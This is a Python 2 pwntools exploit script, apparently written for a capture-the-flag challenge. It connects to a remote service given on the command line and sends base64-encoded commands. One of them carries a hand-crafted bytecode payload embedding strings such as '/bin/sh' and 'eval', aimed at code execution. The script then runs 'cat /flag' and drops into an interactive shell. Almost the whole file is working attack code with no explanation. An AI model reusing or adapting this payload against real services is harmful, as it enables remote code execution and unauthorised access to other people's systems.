#!/usr/bin/env python2

from pwn import *
from IPython import embed
import base64
import re
import sys

context.arch = 'amd64'

#r = remote('127.0.0.1', 7123)
r = remote(sys.argv[1], 6969)

def rep(s, n, name):
    x = base64.b64encode('\x00'.join(['1', s, n, name]))
    r.sendline(x)

def add(a, b, name):
    x = base64.b64encode('\x00'.join(['2', a, b, name]))
    r.sendline(x)

def mul(a, b, name):
    x = base64.b64encode('\x00'.join(['3', a, b, name]))
    #print x
    r.sendline(x)


#add('1', '2', 'a'*0x50)
#raw_input("@")
#r.sendline(base64.b64encode('\x00'.join(['1', 'aaaabbbbccccdddd', '10', 'kk'])))
#r.sendline(base64.b64encode('\x00'.join(['1', 'bbbbcccc', '10', 'kk'])))
#code = open('in', 'rb').read()
r.sendline(base64.b64encode('\x00'.join(['5', '97', '98', 'a'*0x50, '\xbf\x00\x00\x00\x5f\x00\x00\x00\x12\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x0c\x0b\x80\x00\x00\x03\xad\x00\x01\x05\xad\x00\x05\x00\xb0\x00\x03\x01\xb0\x00\x03\x03\x0b\x00\x04\x00\xc0\x00\x01\x05\xad\x00\x05\x00\xb0\x00\x03\x01\xb2\x00\x02\x03\x9b\x00\x00\x03\xad\x00\x02\x05\x0b\x00\x03\x01\xb0\x00\x00\x03\xad\x00\x04\x05\x03\x00\x03\x01\xb0\x80\x00\x01\x04\x00\x00\x00\xa1\x80\x00\x12\x02\x80\x00\x05\x02\x80\x00\x00\x04\x05\x00\x03\x2a\x00\x03\x00\x32\x80\x00\x03\x02\x80\x00\x0c\x02\x00\x00\x03\x7a\x7f\xff\xfa\x02\x00\x02\x03\x0b\x00\x06\x04\x35\x04\x03\x02\x6c\x00\x00\x03\xad\x00\x02\x06\x00\x07\x06\x05\xd2\x80\x10\x07\x04\x00\x05\x01\xb0\x00\x03\x01\xb0\x7f\xff\xf4\x02\x00\x00\x00\xa2\x00\x08\x03\xad\x80\x30\x05\x04\x80\x90\x06\x04\x00\x03\x02\xb0\x00\x08\x03\xad\x00\x02\x05\x0b\x09\x05\x05\x6e\x00\x02\x06\x0b\x09\x06\x06\x6e\x0a\x06\x06\x3a\x0b\x06\x06\x36\x00\x03\x02\xb0\x00\x08\x03\xad\x00\x02\x05\x0b\x0c\x05\x05\x6e\x00\x02\x06\x0b\x0c\x06\x06\x6e\x0d\x06\x06\x3a\x0e\x06\x06\x36\x00\x03\x02\xb0\x00\x00\x03\xad\x00\x01\x05\xad\x00\x05\x00\xb0\x00\x03\x01\xb0\x00\x03\x03\x0b\x00\x04\x00\xc0\x00\x01\x05\xad\x00\x05\x00\xb0\x00\x03\x01\xb2\x00\x02\x03\x9b\x00\x01\x00\xa1\x80\x00\x12\x02\x80\x00\x05\x02\x80\x00\x00\x04\x05\x00\x03\x2a\x00\x03\x00\x32\x80\x00\x03\x02\x80\x00\x0c\x02\x00\x00\x03\x7a\x7f\xff\xfa\x02\x00\x02\x03\x0b\x00\x06\x04\x35\x04\x03\x02\x6c\x00\x00\x03\xad\x00\x02\x06\x00\x07\x06\x05\xd2\x80\x10\x07\x04\x00\x05\x01\xb0\x00\x03\x01\xb0\x7f\xff\xf4\x02\x00\x01\x00\xa2\x00\x0f\x03\xad\x00\x03\x00\xb0\x00\x10\x03\xad\x00\x11\x05\x03\x00\x03\x01\xb0\x00\x00\x00\x9e\x00\x00\x00\x00\x05\x70\x72\x69\x6e\x74\x00\x00\x00\x00\x07\x67\x65\x74\x6e\x61\x6d\x65\x00\x00\x00\x00\x01\x78\x00\x00\x00\x00\x06\x42\x75\x66\x66\x65\x72\x00\x00\x00\x00\x04\x6a\x69\x7a\x7a\x01\x40\x18\x00\x00\x00\x00\x00\x00\x01\x40\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x00\x00\x00\x00\x0c\x66\x69\x6e\x64\x5f\x72\x65\x70\x6c\x61\x63\x65\x01\x40\x54\x40\x00\x00\x00\x00\x00\x01\x40\x64\x00\x00\x00\x00\x00\x00\x01\x40\x54\xc0\x00\x00\x00\x00\x00\x01\x40\x54\x80\x00\x00\x00\x00\x00\x01\x40\x08\x00\x00\x00\x00\x00\x00\x01\x40\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x72\x65\x67\x69\x73\x74\x65\x72\x00\x00\x00\x00\x0c\x65\x78\x69\x74\x5f\x70\x72\x6f\x67\x72\x61\x6d\x00\x00\x00\x00\x07\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x06\x67\x6c\x6f\x62\x61\x6c\x00\x00\x00\x04\x65\x76\x61\x6c\x00\x00\x00\x28\x5f\x00\x00\x00\x03\x00\x00\x00\x14\x00\x00\x00\x11\x00\x00\x00\x21\x00\x00\x00\x10\x08\x20\x81\x00\x41\x00\x84\x88\x01\x00\x20\x40\x02\x00\x82\x01\x09\x41\x00\x00\x00\x00\x00\xff\xff\xff\xff'])))
#r.sendline(base64.b64encode('\x00'.join(['5', 'a', '98', 'a'])))
sleep(0.2)
r.sendline('cat /flag')

r.interactive()

